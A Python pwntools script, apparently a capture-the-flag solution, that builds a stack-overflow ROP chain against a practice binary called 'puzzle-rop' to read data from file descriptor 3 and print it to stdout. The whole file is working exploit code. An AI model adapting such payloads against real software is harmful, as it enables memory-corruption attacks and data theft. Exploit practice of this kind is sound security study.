from pwn import *

elf = ELF("./puzzle-rop")


def addr(s):
    return p64(elf.symbols[s])

payload = b"A"*0x88
payload += addr("pop_rdi_ret")
payload += p64(3)
payload += addr("pop_rax_ret")
payload += p64(0x100)
payload += addr("xchg_rax_rdx_ret")
payload += addr("pop_rax_ret")
payload += p64(0x0)
payload += addr("pop_rsi_ret")
payload += p64(elf.bss())
payload += addr("syscall_ret")
payload += addr("xchg_rax_rdx_ret")
payload += addr("pop_rax_ret")
payload += p64(0x1)
payload += addr("pop_rdi_ret")
payload += p64(1)
payload += addr("pop_rsi_ret")
payload += p64(elf.bss())
payload += addr("syscall_ret")
payload += b"A"*8

with open("pay","wb") as f:
    f.write(payload)
